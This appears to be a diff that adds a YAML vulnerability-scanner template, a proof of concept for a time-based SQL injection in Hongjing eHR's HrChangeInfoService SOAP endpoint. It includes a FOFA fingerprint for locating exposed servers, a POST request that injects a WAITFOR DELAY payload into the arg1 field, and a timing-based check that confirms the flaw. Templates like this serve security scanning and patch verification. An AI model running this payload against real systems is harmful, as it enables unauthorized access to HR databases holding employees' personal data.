@@ -1,0 +1,24 @@
+id: poc-yaml-hjsoft-ehr-hrchangeinfoservice-sqli
+info:
+  name: 宏景eHR HrChangeInfoService SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /services/HrChangeInfoService
+  headers:
+    Content-Type: application/xml
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ \n                  xmlns:hr=\"http://www.hjsj.com/HrChangeInfoService\">\n\
+    \   <soapenv:Header/>\n   <soapenv:Body>\n      <hr:getChangeUsers>\n        \
+    \ <arg0>\n         </arg0>\n         <arg1>admin';WAITFOR DELAY '0:0:{{.t1}}'--</arg1>\n\
+    \         <arg2>1</arg2>\n      </hr:getChangeUsers>\n   </soapenv:Body>\n</soapenv:Envelope>"
+  expression: status_code == 200 && contains(body,"getChangeUsersResponse") && contains(body,"传入的校验用户名密码错误")
+    && contains(content_type,"text/xml") && duration > t1 && duration < t2
+transport: http
